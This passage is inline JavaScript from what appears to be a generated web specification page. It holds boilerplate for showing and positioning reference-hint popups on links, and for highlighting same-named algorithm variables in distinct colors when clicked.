        if (timeout) clearTimeout(timeout);
        timeout = null;
    };
    link.addEventListener("mouseleave", startHidingRefHint);
    link.addEventListener("mouseenter", resetHidingRefHint);
    link.addEventListener("blur", startHidingRefHint);
    link.addEventListener("focus", resetHidingRefHint);
    refHint.addEventListener("mouseleave", startHidingRefHint);
    refHint.addEventListener("mouseenter", resetHidingRefHint);
    refHint.addEventListener("blur", startHidingRefHint);
    refHint.addEventListener("focus", resetHidingRefHint);

    refHint.teardownEventListeners = () => {
        // remove event listeners
        resetHidingRefHint();
        link.removeEventListener("mouseleave", startHidingRefHint);
        link.removeEventListener("mouseenter", resetHidingRefHint);
        link.removeEventListener("blur", startHidingRefHint);
        link.removeEventListener("focus", resetHidingRefHint);
        refHint.removeEventListener("mouseleave", startHidingRefHint);
        refHint.removeEventListener("mouseenter", resetHidingRefHint);
        refHint.removeEventListener("blur", startHidingRefHint);
        refHint.removeEventListener("focus", resetHidingRefHint);
    };
}

function positionRefHint(refHint) {
    const link = refHint.forLink;
    const linkPos = getBounds(link);
    refHint.style.top = linkPos.bottom + "px";
    refHint.style.left = linkPos.left + "px";

    const panelPos = refHint.getBoundingClientRect();
    const panelMargin = 8;
    const maxRight = document.body.parentNode.clientWidth - panelMargin;
    if (panelPos.right > maxRight) {
        const overflowAmount = panelPos.right - maxRight;
        const newLeft = Math.max(panelMargin, linkPos.left - overflowAmount);
        refHint.style.left = newLeft + "px";
    }
}

// TODO: shared util
// Returns the root-level absolute position {left and top} of element.
function getBounds(el, relativeTo=document.body) {
    const relativeRect = relativeTo.getBoundingClientRect();
    const elRect = el.getBoundingClientRect();
    const top = elRect.top - relativeRect.top;
    const left = elRect.left - relativeRect.left;
    return {
        top,
        left,
        bottom: top + elRect.height,
        right: left + elRect.width,
    }
}

function showRefHintListener(e) {
    // If the target isn't in a link (or is a link),
    // just ignore it.
    let link = e.target.closest("a");
    if(!link) return;

    // If the target is in a ref-hint panel
    // (aka a link in the already-open one),
    // also just ignore it.
    if(link.closest(".ref-hint")) return;

    // Otherwise, show the panel for the link.
    showRefHint(link);
}

function hideAllHintsListener(e) {
    // If the click is inside a ref-hint panel, ignore it.
    if(e.target.closest(".ref-hint")) return;
    // Otherwise, close all the current panels.
    hideAllRefHints();
}

document.addEventListener("DOMContentLoaded", () => {
    document.body.addEventListener("mousedown", showRefHintListener);
    document.body.addEventListener("focus", showRefHintListener);

    document.body.addEventListener("click", hideAllHintsListener);
});

window.addEventListener("resize", () => {
    // Hide any open ref hint.
    hideAllRefHints();
});
}
</script>
<script>/* Boilerplate: script-var-click-highlighting */
"use strict";
{
/*
Color-choosing design:

* Colors are ordered by goodness.
* On clicking a var, give it the earliest color
    with the lowest usage in the algorithm.
* On re-clicking, re-use the var's most recent color
    if that's not currently being used elsewhere.
*/

const COLOR_COUNT = 7;

document.addEventListener("click", e=>{
    if(e.target.nodeName == "VAR") {
        highlightSameAlgoVars(e.target);
    }
});

function highlightSameAlgoVars(v) {
    // Find the algorithm container.
    let algoContainer = findAlgoContainer(v);

    // Not highlighting document-global vars,
    // too likely to be unrelated.
    if(algoContainer == null) return;

    const varName = nameFromVar(v);
    if(!v.hasAttribute("data-var-color")) {
        const newColor = chooseHighlightColor(algoContainer, v);
        for(const el of algoContainer.querySelectorAll("var")) {
            if(nameFromVar(el) == varName) {
                el.setAttribute("data-var-color", newColor);
                el.setAttribute("data-var-last-color", newColor);
            }
        }
    } else {
        for(const el of algoContainer.querySelectorAll("var")) {
            if(nameFromVar(el) == varName) {
                el.removeAttribute("data-var-color");
            }
        }
    }
}
function findAlgoContainer(el) {
    while(el != document.body) {
        if(el.hasAttribute("data-algorithm")) return el;
        el = el.parentNode;
    }
    return null;
}
function nameFromVar(el) {
    return el.textContent.replace(/(\s|\xa0)+/g, " ").trim();
}
function colorCountsFromContainer(container) {
    const namesFromColor = Array.from({length:COLOR_COUNT}, x=>new Set());
    for(let v of container.querySelectorAll("var[data-var-color]")) {
        let color = +v.getAttribute("data-var-color");
        namesFromColor[color].add(nameFromVar(v));
    }

    return namesFromColor.map(x=>x.size);
}
function leastUsedColor(colors) {
    // Find the earliest color with the lowest count.
    let minCount = Infinity;
    let minColor = null;
    for(var i = 0; i < colors.length; i++) {
        if(colors[i] < minCount) {
            minColor = i;
            minCount = colors[i];
        }
    }
    return minColor;
}
function chooseHighlightColor(container, v) {
    const colorCounts = colorCountsFromContainer(container);
    if(v.hasAttribute("data-var-last-color")) {
        let color = +v.getAttribute("data-var-last-color");
        if(colorCounts[color] == 0) return color;
    }
    return leastUsedColor(colorCounts);
}
}
</script>